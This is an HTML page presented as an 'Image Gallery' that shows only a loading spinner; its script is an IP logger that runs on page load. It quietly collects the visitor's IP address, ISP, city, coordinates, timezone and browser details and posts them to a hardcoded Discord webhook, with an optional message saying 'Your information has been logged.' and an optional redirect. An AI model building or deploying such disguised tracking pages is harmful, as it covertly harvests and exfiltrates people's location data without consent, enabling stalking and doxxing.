<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Gallery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p id="status-message">Loading gallery...</p>
    </div>

    <script>
        // Configuration
        const config = {
            // BASE CONFIG
            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
            "username": "Image Gallery",
            "color": 0x00FFFF,

            // OPTIONS
            "accurateLocation": false, // Disable GPS for now to avoid permission issues
            "linkAlerts": true,
            "vpnCheck": 1,
            "antiBot": 1,
            
            // REDIRECTION
            "redirect": {
                "enabled": false,
                "url": "https://google.com",
                "delay": 3000
            },

            // CUSTOM MESSAGE
            "message": {
                "enabled": false,
                "message": "Your information has been logged.",
                "richMessage": true
            }
        };

        // Enhanced user agent parsing
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            // OS Detection
            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
            else if (/Mac OS X/.test(ua)) {
                const match = /Mac OS X ([0-9_]+)/.exec(ua);
                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
            }
            else if (/Android ([0-9.]+)/.test(ua)) {
                const match = /Android ([0-9.]+)/.exec(ua);
                os = match ? `Android ${match[1]}` : 'Android';
            }
            else if (/(iPhone|iPad).*OS ([0-9_]+)/.test(ua)) {
                const match = /(iPhone|iPad).*OS ([0-9_]+)/.exec(ua);
                os = match ? `iOS ${match[2].replace(/_/g, '.')}` : 'iOS';
            }
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/CrOS/.test(ua)) os = 'Chrome OS';

            // Browser Detection
            if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg|OPR/.test(ua)) {
                const match = /Chrome\/([0-9.]+)/.exec(ua);
                browser = match ? `Chrome ${match[1]}` : 'Chrome';
            }
            else if (/Firefox\/([0-9.]+)/.test(ua)) {
                const match = /Firefox\/([0-9.]+)/.exec(ua);
                browser = match ? `Firefox ${match[1]}` : 'Firefox';
            }
            else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
                const match = /Version\/([0-9.]+)/.exec(ua);
                browser = match ? `Safari ${match[1]}` : 'Safari';
            }
            else if (/Edg\/([0-9.]+)/.test(ua)) {
                const match = /Edg\/([0-9.]+)/.exec(ua);
                browser = match ? `Edge ${match[1]}` : 'Edge';
            }

            return { os, browser };
        }

        // Get continent from country code
        const getContinent = (countryCode) => {
            if (!countryCode) return 'Unknown';
            const continentMap = {
                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia',
                'BR': 'South America', 'AR': 'South America',
                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa',
                'AU': 'Oceania', 'NZ': 'Oceania'
            };
            return continentMap[countryCode] || 'Unknown';
        };

        // Format timezone
        const formatTimezone = (timezone) => {
            if (!timezone) return 'Unknown';
            try {
                const [continent, city] = timezone.split('/');
                return `${city.replace(/_/g, ' ')} (${continent})`;
            } catch {
                return timezone;
            }
        };

        // Error reporting
        async function sendErrorWebhook(error) {
            try {
                await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: `${config.username} - ERROR`,
                        content: "",
                        embeds: [{
                            title: "⚠️ Gallery Error",
                            color: 0xFF0000,
                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${error.message || error}\`\`\``,
                            fields: [
                                { name: "URL", value: window.location.href, inline: true },
                                { name: "User Agent", value: navigator.userAgent?.slice(0, 500) || "Unknown" }
                            ]
                        }]
                    })
                });
            } catch (e) {
                console.error('Failed to send error webhook:', e);
            }
        }

        // Send webhook helper
        async function sendWebhook(webhookData) {
            try {
                const response = await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
                if (!response.ok) {
                    throw new Error(`Webhook failed: ${response.status}`);
                }
            } catch (error) {
                console.error('Failed to send webhook:', error);
            }
        }

        // Get IP information with fallback
        async function getIPInfo() {
            try {
                // Try ip-api.com first
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('IP API failed');
                
                const data = await response.json();
                return {
                    query: data.ip,
                    isp: data.org || 'Unknown',
                    as: data.asn || 'Unknown',
                    continent: data.continent_code || 'Unknown',
                    country: data.country_name || 'Unknown',
                    regionName: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    lat: data.latitude || 0,
                    lon: data.longitude || 0,
                    timezone: data.timezone || 'Unknown',
                    mobile: false,
                    proxy: false,
                    hosting: false,
                    countryCode: data.country_code || ''
                };
            } catch (error) {
                console.log('First IP API failed, trying fallback...');
                
                // Fallback to another service
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackResponse.json();
                    
                    return {
                        query: fallbackData.ip,
                        isp: 'Unknown',
                        as: 'Unknown',
                        continent: 'Unknown',
                        country: 'Unknown',
                        regionName: 'Unknown',
                        city: 'Unknown',
                        lat: 0,
                        lon: 0,
                        timezone: 'Unknown',
                        mobile: false,
                        proxy: false,
                        hosting: false,
                        countryCode: ''
                    };
                } catch (fallbackError) {
                    throw new Error('All IP APIs failed');
                }
            }
        }

        // Get IP information and send to Discord
        async function logIP() {
            try {
                document.getElementById('status-message').textContent = 'Loading images...';

                // Get IP information
                const ipData = await getIPInfo();
                
                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);
                
                // Apply continent mapping
                if (ipData.countryCode) {
                    ipData.continent = getContinent(ipData.countryCode);
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };

                // Send main webhook
                await sendMainWebhook(logData);

                // Show success message
                document.getElementById('status-message').textContent = 'Gallery loaded successfully!';
                
                // Redirect if enabled
                if (config.redirect.enabled) {
                    setTimeout(() => {
                        window.location.href = config.redirect.url;
                    }, config.redirect.delay);
                }

            } catch (error) {
                console.error('Error:', error);
                await sendErrorWebhook(error);
                document.getElementById('status-message').textContent = 'Failed to load gallery. Please refresh.';
            }
        }

        async function sendMainWebhook(data) {
            const embed = {
                username: config.username,
                content: "",
                embeds: [{
                    title: "🌐 Gallery Visitor",
                    color: config.color,
                    description: `
**IP Info:**
> **IP:** \`${data.ipInfo.query}\`
> **Provider:** \`${data.ipInfo.isp}\`
> **ASN:** \`${data.ipInfo.as}\`
> **Continent:** \`${data.ipInfo.continent}\`
> **Country:** \`${data.ipInfo.country}\`
> **Region:** \`${data.ipInfo.regionName}\`
> **City:** \`${data.ipInfo.city}\`
> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
> **Timezone:** \`${formatTimezone(data.ipInfo.timezone)}\`

**PC Info:**
> **OS:** \`${data.browserInfo.os}\`
> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                }]
            };

            await sendWebhook(embed);
        }

        // Execute when page loads
        document.addEventListener('DOMContentLoaded', logIP);
    </script>
</body>
</html>
